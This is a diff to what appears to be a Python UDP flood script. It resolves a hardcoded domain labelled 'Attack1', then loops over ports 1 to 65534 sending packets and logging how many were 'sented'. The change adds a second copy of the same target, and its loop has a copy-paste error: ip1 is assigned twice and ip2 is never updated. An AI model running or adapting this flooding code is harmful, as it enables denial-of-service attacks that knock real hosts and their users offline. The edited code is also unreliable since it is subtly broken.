@@ -69,10 +69,13 @@ print('\033[1;36m/ac Groundwork')
 time.sleep(1)
 
 # Get ip.
-url = "ffwecc.top"
-ip = socket.gethostbyname(url)
+url1 = "ffwecc.top"
+ip1 = socket.gethostbyname(url1)
+url2 = "ffwecc.top"
+ip2 = socket.gethostbyname(url2)
 
-print('\033[1;31m/marking "Attack1" <%s>\033[0m'%(url))
+print('\033[1;31m/marking "Attack1" <%s>\033[0m'%(url1))
+print('\033[1;31m/marking "Attack1" <%s>\033[0m'%(url2))
 time.sleep(1)
 
 # Value.
@@ -87,7 +90,8 @@ if port_mode == False:  # All ports.
     try:
         while True:
             if port == 65534:                
-                print('\033[32;1m[%s]Sented %s packets to %s through port:1~%s\033[0m'%(dtime, sent, ip, port))
+                print('\033[32;1m[%s]Sented %s packets to %s through port:1~%s\033[0m'%(dtime, sent, ip1, port))
+                print('\033[32;1m[%s]Sented %s packets to %s through port:1~%s\033[0m'%(dtime, sent, ip2, port))
                 print('\033[1;36m/wait %s'%(timeR))
                 port = 1
                 time.sleep(timeR)                               
@@ -95,8 +99,10 @@ if port_mode == False:  # All ports.
             elif port == 1900:
                 port = 1901
 
-            ip = socket.gethostbyname(url)
-            sock.sendto(bytes, (str(ip), port))
+            ip1 = socket.gethostbyname(url1)
+            ip1 = socket.gethostbyname(url2)
+            sock.sendto(bytes, (str(ip1), port))
+            sock.sendto(bytes, (str(ip2), port))
             sent += 1
             port += 1
             timeR = i + random.randint(0,20)
